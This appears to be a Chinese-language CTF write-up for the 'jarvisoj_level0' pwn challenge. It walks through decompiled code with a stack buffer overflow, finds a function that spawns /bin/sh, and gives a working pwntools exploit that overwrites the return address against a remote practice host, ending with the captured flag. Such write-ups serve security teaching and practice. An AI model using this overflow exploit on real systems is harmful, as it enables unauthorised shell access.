---
title: jarvisoj_level0
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

下载附件，用 IDA 64 打开，找到主函数，反汇编，得到以下伪代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  return vulnerable_function();
}
```

一看就知道这个 `vulnerable_function()` 有问题，直接进去，以下是这个函数的代码

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```

高危函数就出来了，这个 `read()` 往一个 0x80 大小的数组中装入 0x200 大小内的数据，马上就知道是栈溢出

## 找 `/bin/sh`

按 Shift + F12 找到 `/bin/sh`，然后跟着找到了函数 `callsystem()`，以下是这个函数的伪代码

```c
int callsystem()
{
  return system("/bin/sh");
}
```

是我想要的东西了，然后 IDA 下面就会写出这个函数的地址，即 `0x400596`

## 编写 Exp

```python
from pwn import *

r = remote("node4.buuoj.cn", 25762)
func_addr = 0x400596
payload = b"A"*(0x80+0x8) + pack(func_addr, 64)  # 0x80 是 buf[128] 的大小，0x8 是 dup
r.sendline(payload)
r.interactive()
```

## 攻入靶机

运行 Exp，`ls`，`cat flag`，最后的结果是 `flag{d99f5551-5834-47ad-8661-a246d0d3f891}`